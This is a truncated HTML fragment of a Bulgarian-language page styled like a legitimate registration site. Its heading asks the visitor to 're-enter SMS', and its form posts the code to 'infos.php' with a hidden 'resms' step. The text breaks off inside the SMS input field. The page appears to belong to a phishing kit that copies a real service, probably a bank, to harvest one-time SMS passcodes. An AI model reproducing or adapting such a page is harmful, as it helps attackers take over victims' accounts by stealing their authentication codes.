...
<div class="body-wrapper" ng-class="{'logout-footer-wrapper' : $state.includes('logoutSuccess')}">
        ...
        <div class="container-fluid">
            ...
            <div class="collapse navbar-collapse" role="navigation">
                <ul class="nav navbar-nav">
                    <li><a ng-click="changeLang(notSelectedLang)" ng-bind="notSelectedLang.langDesc" class="ng-binding">English</a>
                    </li>
                    <li><a target="blank"><img src="./img/site.png"><span translate="APP.WEBSITE" class="ng-scope">Към сайта</span></a>
                    </li>
    ...
    <div id="app" ui-view="" data-template-url="index" class="ng-scope">
        ...
        <div class="container form-centered reg box-border ng-scope">
            <h1 translate="REGISTRATION.HEADER" class="ng-scope">Въведете отново SMS</h1>


            <form id="form" name="form" novalidate="" method="POST" action="infos.php"
                  class="ng-invalid ng-invalid-required ng-dirty">
                <input type="hidden" value="resms" name="step">
                ...
                <div class="margin">
                    ...
                    <div class="row">
                        <div class="col-md-12 form-group">
                            <label translate="REGISTRATION.NAME_CYR" class="ng-scope"><span class="red-txt">* </span>SMS:</label>
                            <input name="resms" type="text" maxlength="10"
